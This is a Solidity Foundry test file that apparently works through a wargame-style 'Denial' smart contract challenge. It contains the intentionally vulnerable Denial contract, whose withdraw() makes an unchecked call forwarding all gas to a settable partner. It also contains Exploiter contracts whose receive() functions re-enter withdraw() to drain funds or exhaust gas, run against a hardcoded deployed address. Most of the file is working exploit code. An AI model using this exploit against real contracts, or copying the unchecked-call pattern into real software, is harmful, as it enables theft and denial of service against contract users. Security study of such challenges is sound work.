// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {HuffDeployer} from "@foundry-huff/HuffDeployer.sol";

contract DenialTest4 is Test {
    Denial denial;
    string public constant DENIAL_HUFF_LOCATION = "Denial";

    function setUp() public {
        // denial = new Denial();
        // deal(address(denial), 1e15);
        denial = Denial(payable(0x6185Be5dF343C299f9424B96A22296A5D4adcb10));
    }

    function test_iteration() public {
        Exploiter exploiter = new Exploiter(address(denial));
        exploiter.setPartner();

        uint256 i;
        while (i < 7) {
            exploiter.exploit();
            i++;
        }
        uint256 gasBef = gasleft();
        vm.expectRevert();
        denial.withdraw();
        uint256 gasAft = gasleft();
        console2.log("Gas: ", gasBef - gasAft);
        console2.log(denial.contractBalance());
    }

    function test_fork() public {
        Exploiter exploiter = new Exploiter(address(denial));
	    address exploiter2 = HuffDeployer.config().deploy(DENIAL_HUFF_LOCATION);
        exploiter.setPartner();

        uint256 i;
        while (i < 40) {
            exploiter.exploit();
            i++;
        }
        console2.log("Balance: ", denial.contractBalance());

        // exploiter.setPartner2(exploiter2);
        denial.withdraw();
        // denial.withdraw();
        // denial.withdraw();
        console2.log("Balance: ", denial.contractBalance());

        // uint256 gasBef = gasleft();
        // vm.expectRevert();
        // denial.withdraw();
        // uint256 gasAft = gasleft();
        // console2.log("Gas: ", gasBef - gasAft);
        // console2.log("Balance: ", denial.contractBalance());
    }
}

contract Exploiter {
    address public immutable denial;    

    constructor(address _instance) {
        denial = _instance;
    }

    function setPartner() external {
        IDenial(denial).setWithdrawPartner(address(this));
    }

    function setPartner2(address _exploit2) external {
        IDenial(denial).setWithdrawPartner(_exploit2);
    }

    function exploit() external {
        _callContract();
    }

    function _callContract() internal {
        if (!_call()) return;
    }

    function _call() internal returns (bool success) {
        address target = denial;
        assembly {
            // Allocate memory for call
            let ptr := mload(0x40)
        
            // Store function selector
            mstore(ptr, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
        
            // Call the contract
            success := call(
                gas(),           // Forward all gas
                target,          // Target address
                1000,               // No ETH value
                ptr,             // Input data pointer
                4,               // Input data length (4 bytes for selector)
                0,               // Output data pointer
                0                // Output data length
            )
        }
    }

    receive() external payable {
        _callContract();
    }
}

contract Exploiter2 {
    address public immutable denial;    

    constructor(address _instance) {
        denial = _instance;
    }

    receive() external payable {
        address target = denial;
        assembly {
            // Allocate memory for call
            let ptr := mload(0x40)
        
            // Store function selector
            mstore(ptr, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
        
            // Call the contract
            pop(call(
                gas(),           // Forward all gas
                target,          // Target address
                0,               // No ETH value
                ptr,             // Input data pointer
                4,               // Input data length (4 bytes for selector)
                0,               // Output data pointer
                0                // Output data length
            ))
        }
    }
}

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function partner() external view returns (address);
    function contractBalance() external view returns (uint256);
}

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}